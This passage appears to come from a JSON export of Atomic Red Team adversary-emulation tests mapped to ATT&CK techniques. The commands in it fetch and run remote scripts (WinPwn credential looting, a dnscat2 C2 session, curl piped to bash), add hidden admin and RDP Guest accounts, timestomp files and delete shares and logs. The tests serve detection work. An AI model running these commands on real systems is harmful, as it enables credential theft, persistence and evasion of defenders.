https://github.com/cyberark/SkyArk \n\n\n**Supported Platforms:** azure-ad\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Azure AD username | String | null | \n | password | Azure AD password | String | T1082Az | "}, "executionSteps": [{"description": "Import-Module $env:temp\\AzureStealth.ps1 -force      \n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-AzAccount -Credential $Credential\nConnect-AzureAD -Credential $Credential\nScan-AzureAdmins -UseCurrentCred\n", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4"], "tags": []}, {"data": {"name": "Creating GCP Service Account and Service Account Key", "shortName": "T1078.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "GCP Service Accounts can be used to gain intial access as well as maintain persistence inside Google Cloud.\n\n\n**Supported Platforms:** google-workspace, iaas:gcp\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | project-id | ID of the project, you want to create service account as well as service account key for | String | art-project-1 | \n | service-account-name | Name of the service account | String | gcp-art-service-account-1 | \n | service-account-email | Email of the service account | String | gcp-art-service-account-1@art-project-1.iam.gserviceaccount.com | \n | output-key-file | Email of the service account | String | gcp-art-service-account-1.json | "}, "executionSteps": [{"description": "gcloud auth login --no-launch-browser\ngcloud config set project #{project-id}\ngcloud iam service-accounts create #{service-account-name}\ngcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}\n", "successCriteria": null}], "techniqueIds": ["clacwm6t003u429mq13okh9en"], "tags": []}, {"data": {"name": "WinPwn - Loot local Credentials - Safetykatz", "shortName": "T1078.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Loot local Credentials - Safetykatz technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsafedump -consoleoutput -noninteractive", "successCriteria": null}], "techniqueIds": ["clacwm6vd03wh29mq2k4rarfx"], "tags": []}, {"data": {"name": "WinPwn - Loot local Credentials - powerhell kittie", "shortName": "T1078.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Loot local Credentials - powerhell kittie technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nobfuskittiedump -consoleoutput -noninteractive", "successCriteria": null}], "techniqueIds": ["clacwm6vd03wh29mq2k4rarfx"], "tags": []}, {"data": {"name": "Create local account with admin priviliges", "shortName": "T1078.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "After execution the new account will be active and added to the Administrators group\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "net user art-test /add\nnet user art-test Password123!\nnet localgroup administrators art-test /add", "successCriteria": null}], "techniqueIds": ["clacwm22800j029mqadvj87u5"], "tags": []}, {"data": {"name": "Create local account with admin privileges - MacOS", "shortName": "T1078.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "After execution the new account will be active and added to the Administrators group\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "dscl . -create /Users/AtomicUser\ndscl . -create /Users/AtomicUser UserShell /bin/bash\ndscl . -create /Users/AtomicUser RealName \"Atomic User\"\ndscl . -create /Users/AtomicUser UniqueID 503\ndscl . -create /Users/AtomicUser PrimaryGroupID 503\ndscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser\ndscl . -passwd /Users/AtomicUser mySecretPassword\ndscl . -append /Groups/admin GroupMembership AtomicUser", "successCriteria": null}], "techniqueIds": ["clacwm6vd03wh29mq2k4rarfx"], "tags": []}, {"data": {"name": "Create local account with admin privileges", "shortName": "T1078.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "After execution the new account will be active and added to the Administrators group\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | password | Password for art-test user | String | -4RTisCool!-321 | "}, "executionSteps": [{"description": "net user art-test /add\nnet user art-test #{password}\nnet localgroup administrators art-test /add", "successCriteria": null}], "techniqueIds": ["clacwm6vd03wh29mq2k4rarfx"], "tags": []}, {"data": {"name": "Enable Guest account with RDP capability and admin priviliges", "shortName": "T1078.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group, and desktop will allow multiple RDP connections\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | guest_user | Specify the guest account | String | guest | \n | guest_password | Specigy the guest password | String | Password123! | "}, "executionSteps": [{"description": "net user #{guest_user} /active:yes\nnet user #{guest_user} #{guest_password}\nnet localgroup administrators #{guest_user} /add\nnet localgroup \"Remote Desktop Users\" #{guest_user} /add\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f", "successCriteria": null}], "techniqueIds": ["clacwm1n5009829mqgmp5filb"], "tags": []}, {"data": {"name": "Enable Guest account with RDP capability and admin privileges", "shortName": "T1078.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,\nand desktop will allow multiple RDP connections.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | guest_user | Specify the guest account | String | guest | \n | guest_password | Specify the guest password | String | Password123! | \n | local_admin_group | Specify the admin localgroup name | String | Administrators | \n | remote_desktop_users_group_name | Specify the remote desktop users group name | String | Remote Desktop Users | \n | remove_rdp_access_during_cleanup | Set to 1 if you want the cleanup to remove RDP access to machine | Integer | 0 | "}, "executionSteps": [{"description": "net user #{guest_user} /active:yes\nnet user #{guest_user} #{guest_password}\nnet localgroup #{local_admin_group} #{guest_user} /add\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /add\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f", "successCriteria": null}], "techniqueIds": ["clacwm66g034w29mqb4o4afiy"], "tags": []}, {"data": {"name": "Activate Guest Account", "shortName": "T1078.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The Adversaries can activate the default Guest user. The guest account is inactivated by default\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | guest_user | Specify the guest account | String | guest | "}, "executionSteps": [{"description": "net user #{guest_user} /active:yes\n", "successCriteria": null}], "techniqueIds": ["clacwm66g034w29mqb4o4afiy"], "tags": []}, {"data": {"name": "Zip a Folder with PowerShell for Staging in Temp", "shortName": "T1074.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip\nwas placed in the temp directory.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Location to save zipped file or folder | Path | $env:TEMP\\Folder_to_zip.zip | \n | input_file | Location of file or folder to zip | Path | PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip | "}, "executionSteps": [{"description": "Compress-Archive -Path #{input_file} -DestinationPath #{output_file} -Force\n", "successCriteria": null}], "techniqueIds": ["clacwm5tk02sl29mqbem3412z", "clacwm22b00j529mqd7pt748b"], "tags": []}, {"data": {"name": "Stage data from Discovery.sh", "shortName": "T1074.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize curl to download discovery.sh and execute a basic information gathering shell script\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Location to save downloaded discovery.bat file | Path | /tmp/T1074.001_discovery.log | "}, "executionSteps": [{"description": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | bash -s > #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm5tk02sl29mqbem3412z", "clacwm22b00j529mqd7pt748b"], "tags": []}, {"data": {"name": "Stage data from Discovery.bat", "shortName": "T1074.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,\nverify that the file is saved in the temp directory.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Location to save downloaded discovery.bat file | Path | $env:TEMP\\discovery.bat | "}, "executionSteps": [{"description": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm5tk02sl29mqbem3412z", "clacwm22b00j529mqd7pt748b"], "tags": []}, {"data": {"name": "Radmin Viewer Utility", "shortName": "T1072", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary may use Radmin Viewer Utility to remotely control Windows device, this will start the radmin console.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | radmin_installer | Radmin Viewer installer | Path | %TEMP%\\RadminViewer.msi | \n | radmin_exe | The radmin.exe executable from RadminViewer.msi | Path | %PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe | "}, "executionSteps": [{"description": "\"#{radmin_exe}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6ev03e429mqhce40ncq"], "tags": []}, {"data": {"name": "PDQ Deploy RAT", "shortName": "T1072", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary may use PDQ Deploy Software to deploy the Remote Adminstartion Tool, this will start the PDQ console.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | PDQ_Deploy_installer | PDQ Deploy Install | Path | %TEMP%\\PDQDeploysetup.exe | \n | PDQ_Deploy_exe | The PDQDeployConsole.exe executable from PDQDeploysetup.exe | Path | %PROGRAMFILES(x86)%\\Admin Arsenal\\PDQ Deploy\\PDQDeployConsole.exe | "}, "executionSteps": [{"description": "\"#{PDQ_Deploy_exe}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6ev03e429mqhce40ncq"], "tags": []}, {"data": {"name": "DNS Regular Beaconing", "shortName": "T1071.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | runtime | Time in minutes to run the simulation | Integer | 30 | \n | domain | Default domain to simulate against | String | 127.0.0.1.xip.io | \n | subdomain | Subdomain prepended to the domain name | String | atomicredteam | \n | query_type | DNS query type | String | TXT | \n | c2_interval | Seconds between C2 requests to the command and control server | Integer | 30 | \n | c2_jitter | Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests | Integer | 20 | "}, "executionSteps": [{"description": "Set-Location PathToAtomicsFolder\n.\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", "successCriteria": null}], "techniqueIds": ["clacwm5sx02s029mq2alg9g7t", "clacwm1lb008229mqeew4ftlx"], "tags": []}, {"data": {"name": "DNS Long Domain Query", "shortName": "T1071.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | query_type | DNS query type | String | TXT | \n | subdomain | Subdomain prepended to the domain name (should be 63 characters to test maximum length) | String | atomicredteamatomicredteamatomicredteamatomicredteamatomicredte | \n | domain | Default domain to simulate against | String | 127.0.0.1.xip.io | "}, "executionSteps": [{"description": "Set-Location PathToAtomicsFolder\n.\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}\n", "successCriteria": null}], "techniqueIds": ["clacwm5sx02s029mq2alg9g7t", "clacwm1lb008229mqeew4ftlx"], "tags": []}, {"data": {"name": "DNS Large Query Volume", "shortName": "T1071.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates an infected host sending a large volume of DNS queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | query_type | DNS query type | String | TXT | \n | subdomain | Subdomain prepended to the domain name | String | atomicredteam | \n | query_volume | Number of DNS queries to send | Integer | 1000 | \n | domain | Default domain to simulate against | String | 127.0.0.1.xip.io | "}, "executionSteps": [{"description": "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"#{query_type}\" \"#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout}\n", "successCriteria": null}], "techniqueIds": ["clacwm5sx02s029mq2alg9g7t", "clacwm1lb008229mqeew4ftlx"], "tags": []}, {"data": {"name": "DNS C2", "shortName": "T1071.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.\nThe following blogs have more information.\n\nhttps://github.com/iagox86/dnscat2\n\nhttps://github.com/lukebaggett/dnscat2-powershell\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | domain | Domain Name configured to use DNS Server where your C2 listener is running | String | example.com | \n | server_ip | IP address of DNS server where your C2 listener is running | String | 127.0.0.1 | "}, "executionSteps": [{"description": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}\n", "successCriteria": null}], "techniqueIds": ["clacwm5sx02s029mq2alg9g7t", "clacwm1lb008229mqeew4ftlx"], "tags": []}, {"data": {"name": "Malicious User Agents - Powershell", "shortName": "T1071.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | domain | Default domain to simulate against | String | www.google.com | "}, "executionSteps": [{"description": "Invoke-WebRequest #{domain} -UserAgent \"HttpBrowser/1.0\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"Wget/1.9+cvs-stable (Red Hat modified)\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"Opera/8.81 (Windows NT 6.0; U; en)\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"*<|>*\" | out-null\n", "successCriteria": null}], "techniqueIds": ["clacwm6q803r029mqh6ndhloi", "clacwm2lr00zt29mq8u0h2ts2"], "tags": []}, {"data": {"name": "Malicious User Agents - Nix", "shortName": "T1071.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates an infected host beaconing to command and control.\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | domain | Default domain to simulate against | String | www.google.com | "}, "executionSteps": [{"description": "curl -s -A \"HttpBrowser/1.0\" -m3 #{domain}\ncurl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 #{domain}\ncurl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 #{domain}\ncurl -s -A \"*<|>*\" -m3 #{domain}\n", "successCriteria": null}], "techniqueIds": ["clacwm6q803r029mqh6ndhloi", "clacwm2lr00zt29mq8u0h2ts2"], "tags": []}, {"data": {"name": "Malicious User Agents - CMD", "shortName": "T1071.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates an infected host beaconing to command and control. Upon execution, no out put will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | domain | Default domain to simulate against | String | www.google.com | \n | curl_path | path to curl.exe | Path | C:\\Windows\\System32\\Curl.exe | "}, "executionSteps": [{"description": "#{curl_path} -s -A \"HttpBrowser/1.0\" -m3 #{domain} >nul 2>&1\n#{curl_path} -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 #{domain} >nul 2>&1\n#{curl_path} -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 #{domain} >nul 2>&1\n#{curl_path} -s -A \"*<|>*\" -m3 #{domain} >nul 2>&1\n", "successCriteria": null}], "techniqueIds": ["clacwm6q803r029mqh6ndhloi", "clacwm2lr00zt29mq8u0h2ts2"], "tags": []}, {"data": {"name": "Windows - Timestomp a File", "shortName": "T1070.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Timestomp kxwn.lock.\n\nSuccessful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. \n\n[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_path | File path for timestomp payload | String | $env:appdata\\Microsoft | "}, "executionSteps": [{"description": "import-module #{file_path}\\timestomp.ps1\ntimestomp -dest \"#{file_path}\\kxwn.lock\"\n", "successCriteria": null}], "techniqueIds": ["clacwm624030y29mqa6czfygw", "clacwm2je00xe29mqbsta6xp4"], "tags": []}, {"data": {"name": "Windows - Modify file last modified timestamp with PowerShell", "shortName": "T1070.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | target_date_time | Date/time to replace original timestamps with | String | 01/01/1970 00:00:00 | \n | file_path | Path of file to change modified timestamp | Path | $env:TEMP\\T1551.006_timestomp.txt | "}, "executionSteps": [{"description": "Get-ChildItem #{file_path} | % { $_.LastWriteTime = \"#{target_date_time}\" }\n", "successCriteria": null}], "techniqueIds": ["clacwm624030y29mqa6czfygw", "clacwm2je00xe29mqbsta6xp4"], "tags": []}, {"data": {"name": "Windows - Modify file last access timestamp with PowerShell", "shortName": "T1070.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | target_date_time | Date/time to replace original timestamps with | String | 01/01/1970 00:00:00 | \n | file_path | Path of file to change last access timestamp | Path | $env:TEMP\\T1551.006_timestomp.txt | "}, "executionSteps": [{"description": "Get-ChildItem #{file_path} | % { $_.LastAccessTime = \"#{target_date_time}\" }\n", "successCriteria": null}], "techniqueIds": ["clacwm624030y29mqa6czfygw", "clacwm2je00xe29mqbsta6xp4"], "tags": []}, {"data": {"name": "Windows - Modify file creation timestamp with PowerShell", "shortName": "T1070.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | target_date_time | Date/time to replace original timestamps with | String | 01/01/1970 00:00:00 | \n | file_path | Path of file to change creation timestamp | Path | $env:TEMP\\T1551.006_timestomp.txt | "}, "executionSteps": [{"description": "Get-ChildItem #{file_path} | % { $_.CreationTime = \"#{target_date_time}\" }\n", "successCriteria": null}], "techniqueIds": ["clacwm624030y29mqa6czfygw", "clacwm2je00xe29mqbsta6xp4"], "tags": []}, {"data": {"name": "Set a file's modification timestamp", "shortName": "T1070.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Stomps on the modification timestamp of a file\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | target_filename | Path of file that we are going to stomp on last access time | Path | /opt/filename | "}, "executionSteps": [{"description": "touch -m -t 197001010000.00 #{target_filename}\n", "successCriteria": null}], "techniqueIds": ["clacwm624030y29mqa6czfygw", "clacwm2je00xe29mqbsta6xp4"], "tags": []}, {"data": {"name": "Set a file's creation timestamp", "shortName": "T1070.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Stomps on the create timestamp of a file\n\nSetting the creation timestamp requires changing the system clock and reverting.\nSudo or root privileges are required to change date. Use with caution.\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | target_filename | Path of file that we are going to stomp on last access time | Path | /opt/filename | "}, "executionSteps": [{"description": "NOW=$(date)\ndate -s \"1970-01-01 00:00:00\"\ntouch #{target_filename}\ndate -s \"$NOW\"\nstat #{target_filename}\n", "successCriteria": null}], "techniqueIds": ["clacwm624030y29mqa6czfygw", "clacwm2je00xe29mqbsta6xp4"], "tags": []}, {"data": {"name": "Set a file's access timestamp", "shortName": "T1070.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Stomps on the access timestamp of a file\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | target_filename | Path of file that we are going to stomp on last access time | Path | /opt/filename | "}, "executionSteps": [{"description": "touch -a -t 197001010000.00 #{target_filename}\n", "successCriteria": null}], "techniqueIds": ["clacwm624030y29mqa6czfygw", "clacwm2je00xe29mqbsta6xp4"], "tags": []}, {"data": {"name": "Modify file timestamps using reference file", "shortName": "T1070.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modifies the `modify` and `access` timestamps using the timestamps of a specified reference file.\n\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | target_file_path | Path of file to modify timestamps of | Path | /opt/filename | \n | reference_file_path | Path of reference file to read timestamps from | Path | /bin/sh | "}, "executionSteps": [{"description": "touch -acmr #{reference_file_path} #{target_file_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm624030y29mqa6czfygw", "clacwm2je00xe29mqbsta6xp4"], "tags": []}, {"data": {"name": "Remove Network Share PowerShell", "shortName": "T1070.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Removes a Network Share utilizing PowerShell\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | share_name | Share to remove. | String | \\\\test\\share | "}, "executionSteps": [{"description": "Remove-SmbShare -Name #{share_name}\nRemove-FileShare -Name #{share_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm6hb03h929mq30xpc52w", "clacwm25p00lp29mq30sid6zl"], "tags": []}, {"data": {"name": "Remove Network Share", "shortName": "T1070.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Removes a Network Share utilizing the command_prompt\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | share_name | Share to remove. | String | \\\\test\\share | "}, "executionSteps": [{"description": "net share #{share_name} /delete\n", "successCriteria": null}], "techniqueIds": ["clacwm6hb03h929mq30xpc52w", "clacwm25p00lp29mq30sid6zl"], "tags": []}, {"data": {"name": "Remove Administrative Shares", "shortName": "T1070.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Administrative shares are hidden network shares created by Microsoft\u2019s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. As Microsoft puts it, \u201cMissing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "for %i in (C$ IPC$ ADMIN$) do net share %i /delete", "successCriteria": null}], "techniqueIds": ["clacwm6hb03h929mq30xpc52w"], "tags": []}, {"data": {"name": "Disable Administrative Share Creation at Startup", "shortName": "T1070.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Administrative shares are hidden network shares created by Microsoft\u2019s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. These shares are automatically created at started unless they have been\npurposefully disabled as is done in this Atomic test. As Microsoft puts it, \"Missing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\"\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /t REG_DWORD /d 0 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm6hb03h929mq30xpc52w"], "tags": []}, {"data": {"name": "Add Network Share", "shortName": "T1070.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Add a Network Share utilizing the command_prompt\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | share_name | Share to add. | String | \\\\test\\share | "}, "executionSteps": [{"description": "net use c: #{share_name}\nnet share test=#{share_name} /REMARK:\"test share\" /CACHE:No\n", "successCriteria": null}], "techniqueIds": ["clacwm6hb03h929mq30xpc52w", "clacwm25p00lp29mq30sid6zl"], "tags": []}, {"data": {"name": "Overwrite and delete a file with shred", "shortName": "T1070.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use the `shred` command to overwrite the temporary file and then delete it\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_to_shred | Path of file to shred | Path | /tmp/victim-shred.txt | "}, "executionSteps": [{"description": "shred -u #{file_to_shred}\n", "successCriteria": null}], "techniqueIds": ["clacwm6ph03q929mqaegpaar1", "clacwm1vn00en29mqc7ghfngq"], "tags": []}, {"data": {"name": "Delete TeamViewer Log Files", "shortName": "T1070.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.\nThis test just places the files in a non-TeamViewer folder, a detection would just check for a deletion event matching the TeamViewer\nlog file format of TeamViewer_##.log. Upon execution, no output will be displayed. Use File Explorer to verify the folder was 